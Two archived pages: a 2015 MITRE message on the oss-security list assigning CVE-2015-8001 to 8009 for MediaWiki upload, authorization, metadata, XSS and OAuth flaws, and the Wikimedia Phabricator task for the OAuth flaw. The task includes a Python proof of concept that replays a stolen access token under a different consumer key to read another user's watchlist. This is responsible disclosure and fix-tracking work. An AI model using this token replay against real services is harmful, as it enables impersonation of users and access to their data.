=== Content from www.openwall.com_cb246a0b_20250125_003249.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](13) [[next>]](15) [[<thread-prev]](../../../2015/10/19/8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20151029202552.288F5B2E09F@smtpvbsrv1.mitre.org>
Date: Thu, 29 Oct 2015 16:25:52 -0400 (EDT)
From: cve-assign@...re.org
To: csteipp@...imedia.org
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: CVE Request: MediaWiki 1.25.3, 1.24.4 and 1.23.11

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> * Wikipedia user RobinHood70 reported that the API failed to correctly stop
> adding new chunks to the upload when the reported size was exceeded,
> allowing a malicious users to upload add an infinite number of chunks for a
> single file upload.
> <<https://phabricator.wikimedia.org/T91203>>

> As long as the so-called final chunk exceeds the filesize rather than
> equalling it, the upload can continue. You can set filesize to 1000,
> upload 2000 bytes in a chunk, then continue uploading data for as long
> as you wish, as long as you continue to claim that the filesize is
> 1000 bytes.

Use CVE-2015-8001.

> * Wikipedia user RobinHood70 also reported that a malicious user could
> upload chunks of 1 byte for very large files, potentially creating a very
> large number of files on the server's filesystem.
> <<https://phabricator.wikimedia.org/T91205>>

> All but the final block should have a minimum chunk size.

Use CVE-2015-8002.

> * Internal review discovered that it is not possible to throttle file
> uploads.
> <<https://phabricator.wikimedia.org/T91850>>

> DESCRIPTION
>
> We don't rate limit uploading files. We should.

Use CVE-2015-8003. An important note here is that the MITRE CVE team
accepted this CVE request only because it came from the organization
that wrote the code. In the general case, adding completely new
functionality such as an upload rate limit is a security enhancement
and not eligible for a CVE ID.

> * Internal review discovered a missing authorization check when removing
> suppression from a revision. This allowed users with the 'viewsuppressed'
> user right but not the appropriate 'suppressrevision' user right to
> unsuppress revisions.
> <<https://phabricator.wikimedia.org/T95589>>

> Check all revisions for suppression, not just the first

Use CVE-2015-8004.

> * Richard Stanway from teamliquid.net reported that thumbnails of PNG files
> generated with ImageMagick contained the local file path in the image
> metadata.
> <<https://phabricator.wikimedia.org/T108616>>

Use CVE-2015-8005.

This CVE ID is not about the default behavior of ImageMagick; it is
about MediaWiki's use of ImageMagick without a command-line option
that prevents pathname disclosure.

There is a separate issue that the machine might be using an old
*Magick program that lacks support for this command-line option (e.g.,
an old version of GraphicsMagick instead of ImageMagick). The MITRE
CVE team did not investigate how this interacts with the MediaWiki
installation process. If the MediaWiki installation process is aware
that only an old *Magick program is installed and would ignore the
command-line option, and none of these is in place:

  - the installation process aborts with an error
  - the "image scaler" functionality is disabled
  - the user is warned that this is an undesirable configuration
  - installation-requirements documentation exists stating that the old
    *Magick program is unsupported

then this is a separate vulnerability that should have its own CVE ID.

Finally, T108616 also mentions "this amount of metadata makes up a
large part of the file size on smaller images, which can waste of
bandwidth." There is no CVE ID for any related DoS attack, e.g.,
abnormally long pathnames or other excessive metadata.

> * Extension:PageTriage - MediaWiki user Grunny discovered a DOM-based XSS in
> the way the extension handled page titles.
> <<https://phabricator.wikimedia.org/T111029>>

Use CVE-2015-8006.

The CVE ID is only about what was fixed in 1.23.11/1.24.4/1.25.3. It
is not about any other issues that might remain, associated with the
<https://phabricator.wikimedia.org/T111029#1600445> "That part of the
PageTriage code is a nightmare, it's very hard to audit for security.
Everything is raw HTML several levels up every imaginable call stack."

> * Extension:Echo - Internal review discovered that Echo could display
> deleted
> or suppressed usernames when the username was previously used to Thank
> users.
> <<https://phabricator.wikimedia.org/T110553>>

> "GoodUser" looks at their notifications and sees "AbusiveUsername"
> everywhere instead of "username removed"

Use CVE-2015-8007.

> * Extension:OAuth - Wikipedia user Sitic discovered that the OAuth
> extension did not correctly enforce the IP restrictions of a Consumer when
> using previously negotiated credentials.
> <<https://phabricator.wikimedia.org/T103022>>

> These IP restrictions only seem to work when negotiating a new client
> token over Special:OAuth/initiate. When I locally make an API request
> with an already existing client/access token I get a valid response
> and no error.

Use CVE-2015-8008.

> * Extension:OAuth - Wikipedia user Sitic discovered that OAuth would accept
> a valid signature from any Consumer when checking the authorization
> signature. This allowed a registered Consumer who gained access to another
> Consumer's users' access tokens and secrets to use those credentials.
> <<https://phabricator.wikimedia.org/T103023>>

> I think there is a check missing in MWOAuthDataStore::lookup_token().
> For access tokens, we lookup the consumer by the access token, and
> don't confirm that the id's match.
>
> This requires that you have the access token for a different
> consumer's users, which should be a rare occurrence.

Use CVE-2015-8009.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJWMn/4AAoJEL54rhJi8gl5Pz4QAJK5bFrsRgwAiu+2N5mgQg7H
cbz0m3uBYkuSV1CiC2LgXeu7CRJ8gtUf7Bok/HwPlRqxZEWfnXcdLRqgbYq6yXNp
J487WOM0dSkuXBIAZ1cbk3D0BGXRuVkSSUNqiAtxLBb75bUQqQbr9hcJuSDZ+SYi
Zoi3U93ZdMcaqyPDt1wq6D3P+9yrJxu7Ve3X67wHi4fc5lEAIU+SZKcA0GjWMhH6
0MbUxEPvx4lXW0r/HT3Rz8Kn2WKY9jJNuK+N06VF8rxGTfdFOeeWVRnBjdIZck0L
RKaI0lHSPx1e5c2uAr+gSip7K1JnT8jaVPALUlP3ODDL8VGIU2qi1bAQ0vFO/D9H
xvLApQxZsCmg7StsQdt9I/bdzPEtQA1/lpet1+G9aDrP3H0bBRHy5/WBEtANK7Fx
1dncHG21c1t2dI+v+/K6iHyZiARQ6X/d8/FgU/8H/QnCWJcmLEJF5uilY2u+PpJR
iBrem0kvV+iFr/M6gGSe73dZSoPiAryJ9T33Dt/+wCllBZYq7nBeQBm7pWBZM+5D
3SOwo+6GUSflH68oTbvnyDrO6fOW+K5hrNXdu6fUdLJoktHJ8UDeAk20X21RNa36
r0fGHU/JAFnfr8oBa44LCqZ+xydjuNQ8iTXy0Fxp1JlzarIQpeHyz49IBUm2rWKM
Ls7SRQdMYbvPMwkxkeJb
=A8Gw
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from phabricator.wikimedia.org_9d9b4dd7_20250125_003251.html ===
Page Menu[HomePhabricator](/)

* SearchConfigure Global Search

[Log In](https://phabricator.wikimedia.org/auth/start/?next=%2FT103023)[Create Task](/maniphest/task/edit/nocreate/) [Maniphest](/maniphest/)  T103023
# API requests don't get validated if signed by the correct OAuth consumerClosed, Resolved[Public](/policy/explain/PHID-TASK-knw4szspkk2p4q6xzjek/view/)Actions

* [Edit Task](/maniphest/task/edit/103023/)
* Edit Related Tasks...
* [Create Subtask](/maniphest/task/subtask/103023/)
* [Edit Parent Tasks](/search/rel/task.has-parent/PHID-TASK-knw4szspkk2p4q6xzjek/)
* [Edit Subtasks](/search/rel/task.has-subtask/PHID-TASK-knw4szspkk2p4q6xzjek/)
* [Merge Duplicates In](/search/rel/task.merge-in/PHID-TASK-knw4szspkk2p4q6xzjek/)
* [Close As Duplicate](/search/rel/task.close-as-duplicate/PHID-TASK-knw4szspkk2p4q6xzjek/)
* Edit Related Objects...
* [Edit Commits](/search/rel/task.has-commit/PHID-TASK-knw4szspkk2p4q6xzjek/)
* [Edit Mocks](/search/rel/task.has-mock/PHID-TASK-knw4szspkk2p4q6xzjek/)
* Subscribe
* [Mute Notifications](/subscriptions/mute/PHID-TASK-knw4szspkk2p4q6xzjek/)
* [Protect as security issue](/wmf/escalate-task/103023/)
* [Award Token](/token/give/PHID-TASK-knw4szspkk2p4q6xzjek/)
* [Flag For Later](/flag/edit/PHID-TASK-knw4szspkk2p4q6xzjek/)

Assigned To

|  | [• csteipp](/p/csteipp/) |
| --- | --- |

Authored By

|  | [Sitic](/p/Sitic/) |
| --- | --- |
| Jun 18 2015, 10:08 PM2015-06-18 22:08:19 (UTC+0) |

Tags

* [MediaWiki-Action-API](/tag/mediawiki-action-api/) [(Non-core-API stuff)](/project/board/200/)
* [MediaWiki-extensions-OAuth](/tag/mediawiki-extensions-oauth/) [(Backlog)](/project/board/682/)
* [Security-Team](/tag/security-team/) [(Our Part Is Done)](/project/board/1179/)
* [Vuln-Authn/Session](/tag/vuln-authn_session/) [(Tracked)](/project/board/1345/)
* [MW-1.27-release (WMF-deploy-2015-10-27\_(1.27.0-wmf.4))](/tag/wmf-deploy-2015-10-27_%281.27.0-wmf.4%29/)
* [Patch-For-Review](/tag/patch-for-review/)
* [Security](/tag/security/)
Referenced Files

|  | [F181100: T103023.patch](/F181100) |
| --- | --- |
| Jun 19 2015, 4:57 PM2015-06-19 16:57:14 (UTC+0) |

Subscribers

|  | [• csteipp](/p/csteipp/) |
| --- | --- |

|  | [Ejegg](/p/Ejegg/) |
| --- | --- |

|  | [gerritbot](/p/gerritbot/) |
| --- | --- |

|  | [Grunny](/p/Grunny/) |
| --- | --- |

|  | [Liuxinyu970226](/p/Liuxinyu970226/) |
| --- | --- |

|  | [• mmodell](/p/mmodell/) |
| --- | --- |

|  | [ProgramCeltic](/p/ProgramCeltic/) |
| --- | --- |

[View All 9 Subscribers](/subscriptions/list/PHID-TASK-knw4szspkk2p4q6xzjek/)
# Description

API requests with OAuth authentication don't seem to get checked if they are signed with the correct consumer token, a consumer secret from a different consumer also works.

As a test case:

* SiticTestUser2 authorizes [consumer 571d07e4e3a8209ee5e83f603e8c4f61](https://www.mediawiki.org/wiki/Special%3AOAuthListConsumers/view/571d07e4e3a8209ee5e83f603e8c4f61) (owned by Sitic, this is the only connected app for SiticTestUser2)
* the negotiated client token are key = 'cf88403442d8b6c025e7aa5693452903', secret = 'a392f8b5913af3cd97dcdef6ed120f0c2375c07d'
* the attacker SiticTestUser steals that client token (from SiticTestUser2)
* SiticTestUser created the new OAuth consumer [0c3c967b69938b175eb595ace1e2cb2f](https://www.mediawiki.org/wiki/Special%3AOAuthListConsumers/view/0c3c967b69938b175eb595ace1e2cb2f) with consumer token key='0c3c967b69938b175eb595ace1e2cb2f', secret='f58062a99780afbb5101534fbc668adb366ae333' (doesn't need to get approved by OAuth admins)
* SiticTestUser makes an API request with the client token from SiticTestUser2 and his new OAuth consumer token -> this should fail, but it doesn't

Test code:

```
import requests
from requests_oauthlib import OAuth1

# access token for SiticTestUser2 obtained from OAuth consumer 571d07e4e3a8209ee5e83f603e8c4f61 (approved consumer, owned by Sitic)
access_token =  {'key': 'cf88403442d8b6c025e7aa5693452903',
                 'secret': 'a392f8b5913af3cd97dcdef6ed120f0c2375c07d'}

# consumer token for OAuth consumer 0c3c967b69938b175eb595ace1e2cb2f
# This consumer is _not_ authorized by SiticTestUser2 and also is not an approved consumer by OAuth Admins (owned by SiticTestUser)
consumer_token = {'key': '0c3c967b69938b175eb595ace1e2cb2f',
                  'secret': 'f58062a99780afbb5101534fbc668adb366ae333'}

auth1 = OAuth1(consumer_token['key'],
               client_secret=consumer_token['secret'],
               resource_owner_key=access_token['key'],
               resource_owner_secret=access_token['secret'])
response = requests.get(
    "https://test.wikipedia.org/w/api.php",
    params={
        'action': "query",
        'list': "watchlist",
        'wlprop': "title",
        'format': "json"
    },
    auth=auth1
)
print response.json()
# Should give error mwoauth-invalid-authorization, but shows watchlist for SiticTestUser2:
# {u'query': {u'watchlist': [{u'ns': 0, u'type': u'edit', u'title': u'Sandbox'}, {u'ns': 2, u'type': u'log', u'title': u'User:SiticTestUser2'}]}}
```

In summary with only the client/access token for a user I can pretend to be that consumer and make API requests in his stead for said user. Because of [T103022](/T103022) IP restrictions by original consumer don't work. As a note here the API permissions (“grants”) from the original authorized consumer seem to apply, not from the consumer of the attacker (I got permissiondenied when trying to make an edit).

I stumbled upon this due to the tools outage.

# Details

|  | Subject | Repo | Branch | Lines +/- |
| --- | --- | --- | --- | --- |
|  | [Handle empty return from MWOAuthDataStore::lookup\_consumer](https://gerrit.wikimedia.org/r/c/247026) | [mediawiki/extensions/OAuth](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth) | [master](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth/%2B/master) | +2 -2 |
|  | [Ensure Consumer key and Access Token Consumer match](https://gerrit.wikimedia.org/r/c/247003) | [mediawiki/extensions/OAuth](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth) | [REL1\_25](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth/%2B/REL1_25) | +5 -0 |
|  | [Ensure Consumer key and Access Token Consumer match](https://gerrit.wikimedia.org/r/c/247002) | [mediawiki/extensions/OAuth](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth) | [REL1\_24](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth/%2B/REL1_24) | +5 -0 |
|  | [Ensure Consumer key and Access Token Consumer match](https://gerrit.wikimedia.org/r/c/247001) | [mediawiki/extensions/OAuth](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth) | [REL1\_23](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth/%2B/REL1_23) | +5 -0 |
|  | [Ensure Consumer key and Access Token Consumer match](https://gerrit.wikimedia.org/r/c/247004) | [mediawiki/extensions/OAuth](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth) | [REL1\_26](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth/%2B/REL1_26) | +5 -0 |
|  | [Ensure Consumer key and Access Token Consumer match](https://gerrit.wikimedia.org/r/c/247006) | [mediawiki/extensions/OAuth](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth) | [master](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/OAuth/%2B/master) | +5 -0 |

[Customize query in gerrit](https://gerrit.wikimedia.org/r/#/q/bug:T103023)
# Related ObjectsSearch...

* Task Graph
* Mentions

|  |  | Status | Subtype | Assigned | Task |
| --- | --- | --- | --- | --- | --- |
|  |  | Resolved |  | *None* | T108064 [MediaWiki Security release 1.25.3](/T108064) |
|  |  | Resolved |  | [• csteipp](/p/csteipp/) | T103023 [API requests don't get validated if signed by the correct OAuth consumer](/T103023) |

Mentioned In [T224919: Code Stewardship Review: OAuth extension](/T224919)
[T107230: OAuth sometimes stops providing tokens for a user, even though the app was not deauthorized](/T107230)
[T103022: OAuth IP restrictions only apply to Special:OAuth/initiate, not to general API requests](/T103022) Mentioned Here [T103022: OAuth IP restrictions only apply to Special:OAuth/initiate, not to general API requests](/T103022)
### Event Timeline

[Maniphest](/maniphest/) changed the visibility from "Public (No Login Required)" to "[Custom Policy](/transactions/new/PHID-XACT-TASK-r5ibth36iqgld6y/)".[Jun 18 2015, 10:08 PM2015-06-18 22:08:19 (UTC+0)](#1380548)[Maniphest](/maniphest/) changed the edit policy from "All Users" to "[Custom Policy](/transactions/new/PHID-XACT-TASK-sl6nhabpq2e3snh/)".Restricted Application added a subscriber: [Aklapper](/p/Aklapper/).  · [View Herald Transcript](/herald/transcript/775621/)[Jun 18 2015, 10:08 PM2015-06-18 22:08:20 (UTC+0)](#1380550)[Sitic](/p/Sitic/) created this task.[Jun 18 2015, 10:08 PM2015-06-18 22:08:20 (UTC+0)](#1380551)[Sitic](/p/Sitic/) updated the task description. [(Show Details)](/transactions/detail/PHID-XACT-TASK-f2kjlwswkcsxpb7/)[Sitic](/p/Sitic/) added projects: [MediaWiki-Action-API](/tag/mediawiki-action-api/), [MediaWiki-extensions-OAuth](/tag/mediawiki-extensions-oauth/), [acl\*security](/tag/acl_security/).[Sitic](/p/Sitic/) changed Security from None to Software security bug.[Sitic](/p/Sitic/) edited subscribers, added: [Sitic](/p/Sitic/); removed: [Aklapper](/p/Aklapper/).[• csteipp](/p/csteipp/) triaged this task as Medium priority.[Jun 18 2015, 11:12 PM2015-06-18 23:12:35 (UTC+0)](#1380857)[• csteipp](/p/csteipp/) subscribed.Comment Actions

I think there is a check missing in MWOAuthDataStore::lookup\_token(). For access tokens, we lookup the consumer by the access token, and don't confirm that the id's match.

This requires that you have the access token for a different consumer's users, which should be a rare occurrence.

[• csteipp](/p/csteipp/) claimed this task.[Jun 18 2015, 11:12 PM2015-06-18 23:12:56 (UTC+0)](#1380861)[• csteipp](/p/csteipp/) added a project: [Security-Team](/tag/security-team/).[Anomie](/p/Anomie/) moved this task from [Unsorted](/project/board/200/) to [Non-core-API stuff](/project/board/200/) on the [MediaWiki-Action-API](/tag/mediawiki-action-api/) board.[Jun 19 2015, 4:05 PM2015-06-19 16:05:51 (UTC+0)](#1382759)[• csteipp](/p/csteipp/) added a comment.[Jun 19 2015, 4:57 PM2015-06-19 16:57:14 (UTC+0)](#1382969)Comment Actions

T103023.patch1 KB[Download](https://phab.wmfusercontent.org/file/download/c55gsuocdxkdvoowoo4j/PHID-FILE-x76qgcnzofzdq5kzvbsn/T103023.patch)

[Anomie](/p/Anomie/) subscribed.[Jun 19 2015, 8:50 PM2015-06-19 20:50:20 (UTC+0)](#1383926)Comment Actions
> In [T103023#1382969](/T103023#1382969), [@csteipp](/p/csteipp/) wrote:
>
> T103023.patch1 KB[Download](https://phab.wmfusercontent.org/file/download/c55gsuocdxkdvoowoo4j/PHID-FILE-x76qgcnzofzdq5kzvbsn/T103023.patch)

Looks sane. Haven't tested.

[• csteipp](/p/csteipp/) added a comment.[Jun 19 2015, 11:32 PM2015-06-19 23:32:35 (UTC+0)](#1384367)Comment Actions

[@Sitic](/p/Sitic/), do you have a local OAuth instance that you can test this patch and verify that it fixes the issue?

[Sitic](/p/Sitic/) added a comment.[Jun 21 2015, 12:16 PM2015-06-21 12:16:35 (UTC+0)](#1385841)Comment Actions
> In [T103023#1384367](/T103023#1384367), [@csteipp](/p/csteipp/) wrote:
>
> [@Sitic](/p/Sitic/), do you have a local OAuth instance that you can test this patch and verify that it fixes the issue?

Tested locally, fixes the issue (getting The authorization headers in your request are not valid: No approved grant was found for that authorization token error info now).

[• csteipp](/p/csteipp/) added a subscriber: [• mmodell](/p/mmodell/).[Jun 22 2015, 8:36 PM2015-06-22 20:36:48 (UTC+0)](#1389328)Comment Actions

[@mmodell](/p/mmodell/), can you deploy T103023.patch1 KB[Download](https://phab.wmfusercontent.org/file/download/c55gsuocdxkdvoowoo4j/PHID-FILE-x76qgcnzofzdq5kzvbsn/T103023.patch) and confirm here when it's on the cluster?

[• csteipp](/p/csteipp/) moved this task from [Incoming](/project/board/1179/) to [In Progress](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[Jun 25 2015, 9:57 PM2015-06-25 21:57:23 (UTC+0)](#1402597)[• csteipp](/p/csteipp/) moved this task from [In Progress](/project/board/1179/) to [Waiting](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[• csteipp](/p/csteipp/) moved this task from [Waiting](/project/board/1179/) to [In Progress](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[• csteipp](/p/csteipp/) closed this task as Resolved.[Jul 8 2015, 8:58 PM2015-07-08 20:58:37 (UTC+0)](#1439108)[• csteipp](/p/csteipp/) mentioned this in [T103022: OAuth IP restrictions only apply to Special:OAuth/initiate, not to general API requests](/T103022).Comment Actions

20:56 csteipp: deployed patches for [T103022](/T103022) & [T103023](/T103023)

[• csteipp](/p/csteipp/) added a project: [Vuln-Authn/Session](/tag/vuln-authn_session/).[Aug 20 2015, 9:47 PM2015-08-20 21:47:28 (UTC+0)](#1558897)[• csteipp](/p/csteipp/) moved this task from [In Progress](/project/board/1179/) to [Our Part Is Done](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[Oct 13 2015, 11:56 PM2015-10-13 23:56:37 (UTC+0)](#1724039)[• csteipp](/p/csteipp/) added a parent task: [T108064: MediaWiki Security release 1.25.3](/T108064).[Oct 16 2015, 4:57 PM2015-10-16 16:57:14 (UTC+0)](#1731182)[• csteipp](/p/csteipp/) added subscribers: [ProgramCeltic](/p/ProgramCeltic/), [Grunny](/p/Grunny/), [Ejegg](/p/Ejegg/).[Oct 16 2015, 6:13 PM2015-10-16 18:13:29 (UTC+0)](#1731491)[• demon](/p/demon/) changed the visibility from "[Custom Policy](/transactions/old/PHID-XACT-TASK-kd467oz24n5344w/)" to "Public (No Login Required)".[Oct 16 2015, 10:35 PM2015-10-16 22:35:20 (UTC+0)](#1732185)[• demon](/p/demon/) changed the edit policy from "[Custom Policy](/transactions/old/PHID-XACT-TASK-st6xtfqww47zpjq/)" to "All Users".[• demon](/p/demon/) changed Security from Software security bug to None.[ReleaseTaggerBot](/p/ReleaseTaggerBot/) added a project: [MW-1.27-release (WMF-deploy-2015-10-27\_(1.27.0-wmf.4))](/tag/wmf-deploy-2015-10-27_%281.27.0-wmf.4%29/).[Oct 16 2015, 11:00 PM2015-10-16 23:00:39 (UTC+0)](#1732231)[gerritbot](/p/gerritbot/) subscribed.[Oct 17 2015, 1:26 AM2015-10-17 01:26:29 (UTC+0)](#1732476)Comment Actions

Change 247026 had a related patch set uploaded (by Gergő Tisza):

Handle empty return from MWOAuthDataStore::lookup\_consumer

<https://gerrit.wikimedia.org/r/247026>

[gerritbot](/p/gerritbot/) added a project: [Patch-For-Review](/tag/patch-for-review/).[Oct 17 2015, 1:26 AM2015-10-17 01:26:30 (UTC+0)](#1732477)[gerritbot](/p/gerritbot/) added a comment.[Oct 17 2015, 1:50 AM2015-10-17 01:50:55 (UTC+0)](#1732481)Comment Actions

Change 247026 merged by jenkins-bot:

Handle empty return from MWOAuthDataStore::lookup\_consumer

<https://gerrit.wikimedia.org/r/247026>

[Ricordisamoa](/p/Ricordisamoa/) subscribed.[Oct 18 2015, 11:48 PM2015-10-18 23:48:53 (UTC+0)](#1733661)[• csteipp](/p/csteipp/) added a comment.[Nov 3 2015, 9:27 PM2015-11-03 21:27:03 (UTC+0)](#1779341)Comment Actions

Assigned CVE-2015-8009

[Tgr](/p/Tgr/) mentioned this in [T107230: OAuth sometimes stops providing tokens for a user, even though the app was not deauthorized](/T107230).[Sep 9 2016, 8:40 PM2016-09-09 20:40:18 (UTC+0)](#2624540)[Tgr](/p/Tgr/) mentioned this in [T224919: Code Stewardship Review: OAuth extension](/T224919).[Jun 10 2019, 10:05 PM2019-06-10 22:05:44 (UTC+0)](#5248385)[• chasemp](/p/chasemp/) added a project: [Security](/tag/security/).[Feb 10 2020, 10:59 PM2020-02-10 22:59:36 (UTC+0)](#5869783) · Restricted Application added a subscriber: [Liuxinyu970226](/p/Liuxinyu970226/).  · [View Herald Transcript](/herald/transcript/3521239/)[Feb 10 2020, 10:59 PM2020-02-10 22:59:37 (UTC+0)](#5869785) · [• chasemp](/p/chasemp/) removed a project: [acl\*security](/tag/acl_security/).[Feb 20 2020, 8:17 PM2020-02-20 20:17:56 (UTC+0)](#5904810) · [Aklapper](/p/Aklapper/) removed a subscriber: [Anomie](/p/Anomie/).[Oct 16 2020, 5:42 PM2020-10-16 17:42:26 (UTC+0)](#6555118) · [Log In to Comment](/login/?next=)Content licensed under Creative Commons Attribution-ShareAlike (CC BY-SA) 4.0 unless otherwise noted; code licensed under GNU General Public License (GPL) 2.0 or later and other open source licenses. By using this site, you agree to the Terms of Use, Privacy Policy, and Code of Conduct. · [Wikimedia Foundation](https://wikimediafoundation.org/) · [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ANon-wiki_privacy_policy) · [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct) · [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use/Phabricator) · [Disclaimer](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AGeneral_disclaimer) · [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) · [GPL](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html) · [Credits](https://www.mediawiki.org/wiki/Phabricator/Credits)
